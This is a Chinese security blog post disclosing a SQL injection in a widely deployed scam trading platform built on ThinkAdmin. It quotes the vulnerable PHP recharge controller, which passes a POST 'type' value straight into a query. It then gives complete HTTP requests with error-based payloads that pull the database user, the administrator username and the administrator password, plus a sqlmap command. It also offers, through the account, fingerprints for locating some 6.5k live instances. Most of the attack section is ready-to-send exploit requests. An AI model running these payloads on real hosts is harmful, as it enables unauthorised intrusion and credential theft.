> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzg4MTkwMTI5Mw==&mid=2247490236&idx=1&sn=39ed76d3bfcabdd4def2ba2bd953ba5c

#  某诈骗微盘存在前台SQL注入漏洞  
原创 Mstir  星悦安全   2025-07-21 06:40  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字  
关注我们 并设为  
星标  
## 0x00 前言  
  
某八国语言微盘杀猪盘，前台一般可以直接注册开户，类似交易所，杠杆，后台一堆功能，用户钱包，提现，关系网，系统管理，Fofa量还挺大的，有6.5k  
  
**fofa指纹 : 在文末!**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ff2nTGAicZxYPDKkW7NaujwXEalmXLlib31pdaAZrGKuZEnyeQlLy12VBYQvmb3Z3YRyCicrQJ2lbibA/640?wx_fmt=png&from=appmsg "")  
  
前端:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ff2nTGAicZxYPDKkW7NaujwiaHutrNB2GHpC450iaxfJiazlia252I0xNA8DxicXPEpe3jYKSXeojqyyPw/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5ff2nTGAicZxYPDKkW7NaujweYckorEUjIRc9IHoGRBKibTzMk2JnianicrxapI8ibTThhvuAqYY0vXvxA/640?wx_fmt=other&from=appmsg "")  
  
后端:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ff2nTGAicZxYPDKkW7NaujwhjnphG0ZF8oQCSr02mwAnwFhl4tEWxVDibs3HXVq97XKEIttl9aIaqA/640?wx_fmt=png&from=appmsg "")  
  
框架:ThinkAdmin Debug:True  
## 0x01 漏洞分析&复现  
  
**需前台普通用户登录**  
  
**位于 /application/index/controller/User.php 控制器的 dorecharge 方法，通过POST传入type参数，直接进入SQL查询字句，导致漏洞产生.**  
  

```
public function dorecharge(){
  $uid = $this->app->session->get('uid');
if(!$uid) $this->redirect('/index/login');
if($this->app->request->isPost()){
    $payments=Db::table('lc_payments')->where('id = '.$_POST['type'])->find();
    $userinfo = Db::name('LcUser')->find($uid);
    $orderid=&#34;CZ&#34;.$uid.$payments['title'].date('YmdHis',time()).mt_rand(10,99);
    $add = array(
      'orderid' => $orderid,
      'uid' => $uid,
      'money' => $_POST['money'],
      'type' => $payments['title'],
      'status' => 0,
      'reason' => &#34;用户前台充值&#34;,
      'time' => date('Y-m-d H:i:s'),
      'time2' => '0000-00-00 00:00:00'
    );
    $re = Db::name('LcRecharge')->insertGetId($add);
    if($re){
      $ok=array(
        'code'=>1,
        'info'=>lang('tips_do_success')
      );return $ok;die;
    }else{
      $ok=array(
        'code'=>0,
        'info'=>lang('tips_do_failed').lang('key_contact_cs')
      );return $ok;die;
    }
  }

}

```

  
Payload:  

```
POST /index/user/dorecharge HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 17
Content-Type: application/x-www-form-urlencoded
Cookie: think_var=hk; s47696c33=mp6s4pmvbpa4nqluhbdr7d3pvc
Host: 192.168.140.128
Origin: http://192.168.140.128
Referer: http://192.168.140.128/index/user/dorecharge
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36

type=GTID_SUBSET(CONCAT((SELECT (USER()))),2235)&money=1222

```

  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5ff2nTGAicZxYPDKkW7NaujwpDdr2Z1CDlxrCg5pp0omLeo0tcdqmnGflxapn15E8qvr3fgzqMH6Ig/640?wx_fmt=other&from=appmsg "")  
跑出管理员账户：  

```
POST /index/user/dorecharge HTTP/1.1
Content-Length: 154
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Cookie: s47696c33=9v1raoo6lcnhpshrs9p1elfr82; think_var=hk
Host: 192.168.140.128
Origin: http://192.168.140.128
Referer: http://192.168.140.128/index/user/dorecharge
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Connection: close

type=GTID_SUBSET(CONCAT((SELECT MID((IFNULL(CAST(username AS NCHAR),0x20)),1,190) FROM `fast`.`system_user` ORDER BY username LIMIT 0,1)),9985)&money=1222

```

  
跑出管理员密码：  

```
POST /index/user/dorecharge HTTP/1.1
Content-Length: 154
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Cookie: s47696c33=9v1raoo6lcnhpshrs9p1elfr82; think_var=hk
Host: 192.168.140.128
Origin: http://192.168.140.128
Referer: http://192.168.140.128/index/user/dorecharge
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Connection: close

type=GTID_SUBSET(CONCAT((SELECT MID((IFNULL(CAST(password AS NCHAR),0x20)),1,190) FROM `fast`.`system_user` ORDER BY username LIMIT 0,1)),9985)&money=1222

```

  
  
**Python sqlmap.py -r a.txt --level=3 --dbms=mysql**  
  
****  
****  
**在 yebstop 方法，id 参数同样存在注入，Payload相同，不再详写.**  
  
****  
****  
**投资需谨慎，谨防杀猪盘 !!!**  
  
## 0x02 Fofa指纹  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，交易所**  
  
**关注公众号，发送 250721 获取Fofa指纹!**  
  
****  
  
****  
**免责声明:文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
  
